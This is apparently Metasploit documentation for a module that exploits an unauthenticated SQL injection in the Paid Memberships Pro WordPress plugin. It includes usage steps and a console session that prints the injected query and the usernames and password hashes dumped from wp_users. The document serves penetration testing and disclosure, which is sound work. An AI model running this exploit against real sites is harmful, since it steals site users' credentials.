## Vulnerable Application

Paid Membership Pro, a WordPress plugin,
prior to 2.9.8 is affected by an unauthenticated SQL injection via the
`code` parameter.

The plugin can be downloaded from https://wordpress.org/plugins/paid-memberships-pro/, like
(2.9.7)[https://downloads.wordpress.org/plugin/paid-memberships-pro.2.9.7.zip]

## Verification Steps

1. Install the plugin
2. Start msfconsole
3. Do: `use auxiliary/scanner/http/wp_paid_membership_pro_code_sqli`
4. Do: `set rhosts [ip]`
5. Do: `run`
6. You should get the users and hashes returned.

## Options

### ACTION: List Users

This action lists `COUNT` users and password hashes.

### COUNT

If action `List Users` is selected (default), this is the number of users to enumerate.
The larger this list, the more time it will take.  Defaults to `1`.

## Scenarios

### Paid Membership Pro 2.9.7 on Wordpress 5.7.5 on Ubuntu 20.04

```
msf6 > use auxiliary/scanner/http/wp_paid_membership_pro_code_sqli
[*] Using auxiliary/scanner/http/wp_paid_membership_pro_code_sqli
msf6 auxiliary(scanner/http/wp_paid_membership_pro_code_sqli) > set rhosts 1.1.1.1
rhosts => 1.1.1.1
msf6 auxiliary(scanner/http/wp_paid_membership_pro_code_sqli) > set verbose true
verbose => true
msf6 auxiliary(scanner/http/wp_paid_membership_pro_code_sqli) > check

[*] Checking /wp-content/plugins/paid-memberships-pro/readme.txt
[*] Found version 2.9.7 in the plugin
[*] 1.1.1.1:80 - The target appears to be vulnerable.
msf6 auxiliary(scanner/http/wp_paid_membership_pro_code_sqli) > exploit

[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking /wp-content/plugins/paid-memberships-pro/readme.txt
[*] Found version 2.9.7 in the plugin
[+] The target appears to be vulnerable.
[*] Enumerating Usernames and Password Hashes
[!] Each user will take about 5-10 minutes to enumerate. Be patient.
[*] {SQLi} Executing (select group_concat(NAbWtHUpd) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) NAbWtHUpd from wp_users limit 3) Ip)
[*] {SQLi} Time-based injection: expecting output of length 124
[+] Dumped table contents:
wp_users
========

 user_login  user_pass
 ----------  ---------
 admin       $P$BZlPX7NIx8MYpXokBW2AGsN7i.aUOt0
 admin2      $P$BNS2BGBTJmjIgV0nZWxAZtRfq1l19p1
 editor      $P$BdWSGpy/tzJomNCh30a67oJuBEcW0K/

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
